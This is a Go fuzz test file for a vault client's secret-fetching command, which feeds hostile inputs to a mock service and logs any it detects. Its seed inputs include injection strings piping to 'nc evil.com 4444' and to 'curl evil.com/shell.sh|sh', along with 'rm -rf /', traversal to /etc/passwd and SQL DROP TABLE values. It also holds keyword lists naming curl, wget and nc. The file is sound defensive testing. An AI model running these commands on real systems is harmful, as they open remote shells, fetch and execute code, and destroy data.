package vault

import (
	"context"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/domain/vault"
)

// FuzzGetSecretCommandSecurity tests GetSecretCommand for security vulnerabilities
func FuzzGetSecretCommandSecurity(f *testing.F) {
	// Seed with various path scenarios including security issues
	f.Add("secret/data/myapp")
	f.Add("")
	f.Add("../../../etc/passwd")
	f.Add("secret/data/../../admin")
	f.Add("secret/data/app;rm -rf /")
	f.Add("secret/data/app$(whoami)")
	f.Add("secret/data/app`id`")
	f.Add("secret/data/app\x00/etc/shadow")
	f.Add("secret/data/app\n/another/path")
	f.Add("secret/data/${VAULT_TOKEN}")
	f.Add(strings.Repeat("A", 10000))
	f.Add("secret/data/app|nc evil.com 4444")
	f.Add("secret/data/app&&curl evil.com/shell.sh|sh")
	f.Add("secret/data/app'; DROP TABLE secrets;--")
	f.Add("\\\\server\\share\\secret")
	f.Add("file:///etc/passwd")
	f.Add("http://evil.com/secret")

	f.Fuzz(func(t *testing.T, path string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("GetSecretCommand handling panicked with path=%q: %v", path, r)
			}
		}()

		// Create command with fuzzed path
		cmd := GetSecretCommand{Path: path}

		// Security validation checks
		// Check for path traversal attempts
		if strings.Contains(path, "..") {
			t.Logf("Path traversal attempt detected: %q", path)
		}

		// Check for null byte injection
		if strings.Contains(path, "\x00") {
			t.Logf("Null byte injection detected in path: %q", path)
		}

		// Check for command injection patterns
		injectionPatterns := []string{
			";", "&&", "||", "|", "`", "$(", "${",
			"rm -rf", "curl", "wget", "nc ", "bash",
			"sh ", "exec", "system(", "eval(",
		}

		for _, pattern := range injectionPatterns {
			if strings.Contains(path, pattern) {
				t.Logf("Command injection pattern '%s' detected in path", pattern)
			}
		}

		// Check for newline injection (log injection)
		if strings.Contains(path, "\n") || strings.Contains(path, "\r") {
			t.Logf("Newline injection detected in path (potential log injection)")
		}

		// Check for SQL injection patterns
		sqlPatterns := []string{
			"'; DROP", "' OR '", "' UNION",
			"'; DELETE", "' OR 1=1", "'; UPDATE",
		}
		for _, pattern := range sqlPatterns {
			if strings.Contains(path, pattern) {
				t.Logf("SQL injection pattern detected: %q", pattern)
			}
		}

		// Check for URL/protocol injection
		protocols := []string{"http://", "https://", "file://", "ftp://", "ssh://"}
		for _, proto := range protocols {
			if strings.HasPrefix(path, proto) {
				t.Logf("Protocol injection attempt: %q", path)
			}
		}

		// Check for Windows path injection
		if strings.Contains(path, "\\") || strings.Contains(path, "C:") {
			t.Logf("Windows path pattern detected: %q", path)
		}

		// Check for extremely long paths (DoS)
		if len(path) > 1024 {
			t.Logf("Extremely long path (%d bytes) - potential DoS", len(path))
		}

		// Create mock service to test command execution
		mockService := &MockVaultService{}
		commands := NewCommands(mockService)

		// Test empty path validation
		if path == "" {
			mockService.On("CheckHealth", context.Background()).Maybe().Return(nil)
			_, err := commands.Execute(context.Background(), cmd)
			if err == nil || !strings.Contains(err.Error(), "path is required") {
				t.Errorf("Empty path should be rejected")
			}
			return
		}

		// For non-empty paths, test execution
		mockService.On("CheckHealth", context.Background()).Return(nil)
		mockService.On("GetSecret", context.Background(), path).Return(
			&vault.Secret{Path: path, Data: map[string]interface{}{}}, nil)

		_, err := commands.Execute(context.Background(), cmd)
		if err != nil {
			t.Logf("Command execution error: %v", err)
		}

		// Verify the path wasn't modified
		if len(mockService.Calls) >= 2 {
			actualPath := mockService.Calls[1].Arguments.String(1)
			if actualPath != path {
				t.Logf("Path was modified during execution: %q -> %q", path, actualPath)
			}
		}
	})
}

// FuzzSecretDataSecurity tests secret data handling for security issues
func FuzzSecretDataSecurity(f *testing.F) {
	// Seed with various data scenarios
	f.Add("key", "value")
	f.Add("", "")
	f.Add("password", "admin123")
	f.Add("token", "eyJhbGciOiJIUzI1NiIs...")
	f.Add("script", "#!/bin/bash\nrm -rf /")
	f.Add("sql", "'; DROP TABLE users;--")
	f.Add("cmd", "$(whoami)")
	f.Add("backtick", "`id`")
	f.Add("newline", "value\ninjected: true")
	f.Add("null", "value\x00hidden")
	f.Add("unicode", "value\u202e\u0000")
	f.Add("xml", "<script>alert('xss')</script>")
	f.Add("json", "{\"admin\": true}")
	f.Add("yaml", "- admin: true\n- sudo: ALL")

	f.Fuzz(func(t *testing.T, key, value string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Secret data handling panicked with key=%q value=%q: %v", key, value, r)
			}
		}()

		// Create secret with fuzzed data
		secretData := map[string]interface{}{
			key: value,
		}

		// Security checks on the data
		dataStr := key + value

		// Check for script injection
		if strings.Contains(dataStr, "#!/") || strings.Contains(dataStr, "rm -rf") {
			t.Logf("Script injection detected in secret data")
		}

		// Check for command substitution
		if strings.Contains(dataStr, "$(") || strings.Contains(dataStr, "`") {
			t.Logf("Command substitution detected in secret data")
		}

		// Check for null bytes
		if strings.Contains(dataStr, "\x00") {
			t.Logf("Null byte detected in secret data")
		}

		// Check for control characters
		for i := 0; i < 32; i++ {
			if i == 9 || i == 10 || i == 13 {
				continue // Tab, LF, CR might be legitimate
			}
			if strings.Contains(dataStr, string(rune(i))) {
				t.Logf("Control character (0x%02x) detected in secret data", i)
			}
		}

		// Check for Unicode direction override characters
		dangerousUnicode := []rune{
			'\u202a', '\u202b', '\u202c', '\u202d', '\u202e', // Directional
			'\u200b', '\u200c', '\u200d', // Zero-width
			'\ufeff', // Byte order mark
		}
		for _, r := range dangerousUnicode {
			if strings.ContainsRune(dataStr, r) {
				t.Logf("Dangerous Unicode character detected: U+%04X", r)
			}
		}

		// Check for extremely long values (DoS)
		if len(value) > 1048576 { // 1MB
			t.Logf("Extremely large secret value: %d bytes", len(value))
		}

		// Create a secret and test handling
		secret := &vault.Secret{
			Path: "test/path",
			Data: secretData,
		}

		// Verify data integrity
		if storedValue, ok := secret.Data[key]; ok {
			if str, ok := storedValue.(string); ok && str != value {
				t.Errorf("Secret value was modified: %q -> %q", value, str)
			}
		}

		// Check for special key names that might cause issues
		dangerousKeys := []string{
			"__proto__", "constructor", "prototype", // JavaScript prototype pollution
			"$ref", "$id", "$schema",                 // JSON reference injection
			"", // Empty key
		}
		for _, dangerous := range dangerousKeys {
			if key == dangerous {
				t.Logf("Potentially dangerous key name: %q", key)
			}
		}
	})
}

// FuzzVaultServiceInteractionSecurity tests service interaction security
func FuzzVaultServiceInteractionSecurity(f *testing.F) {
	// Seed with various interaction scenarios
	f.Add("normal/path", "normal", "value", true, false)
	f.Add("", "", "", false, false)
	f.Add("path/with/../../traversal", "key", "value", true, true)
	f.Add("path", "key\ninjection", "value\ninjection", true, false)
	f.Add("path", "key", "value", false, true) // Health check failure
	f.Add(strings.Repeat("path/", 100), "key", "value", true, false)

	f.Fuzz(func(t *testing.T, path, dataKey, dataValue string, healthOk, secretOk bool) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Service interaction panicked: %v", r)
			}
		}()

		// Create mock service
		mockService := &MockVaultService{}
		commands := NewCommands(mockService)
		ctx := context.Background()

		// Create command
		cmd := GetSecretCommand{Path: path}

		// Skip empty path as it's validated
		if path == "" {
			_, err := commands.Execute(ctx, cmd)
			if err == nil || !strings.Contains(err.Error(), "required") {
				t.Errorf("Empty path should fail validation")
			}
			return
		}

		// Setup health check mock
		if healthOk {
			mockService.On("CheckHealth", ctx).Return(nil)
		} else {
			mockService.On("CheckHealth", ctx).Return(context.DeadlineExceeded)
		}

		// Setup get secret mock if health passes
		if healthOk {
			if secretOk {
				secret := &vault.Secret{
					Path: path,
					Data: map[string]interface{}{
						dataKey: dataValue,
					},
				}
				mockService.On("GetSecret", ctx, path).Return(secret, nil)
			} else {
				mockService.On("GetSecret", ctx, path).Return(nil, context.Canceled)
			}
		}

		// Execute command
		result, err := commands.Execute(ctx, cmd)

		// Validate behavior
		if !healthOk {
			if err == nil || !strings.Contains(err.Error(), "health check failed") {
				t.Errorf("Health check failure not properly handled")
			}
			return
		}

		if !secretOk {
			if err == nil || !strings.Contains(err.Error(), "getting secret") {
				t.Errorf("Secret retrieval failure not properly handled")
			}
			return
		}

		// If both checks pass, verify result
		if err != nil {
			t.Logf("Unexpected error: %v", err)
		} else if result != nil {
			// Verify data integrity
			if val, ok := result.Data[dataKey]; ok {
				if str, ok := val.(string); ok && str != dataValue {
					t.Errorf("Data corruption detected")
				}
			}

			// Check for injection in response
			for k, v := range result.Data {
				if str, ok := v.(string); ok {
					if strings.Contains(k+str, "\n") {
						t.Logf("Newline in secret data - potential log injection")
					}
				}
			}
		}
	})
}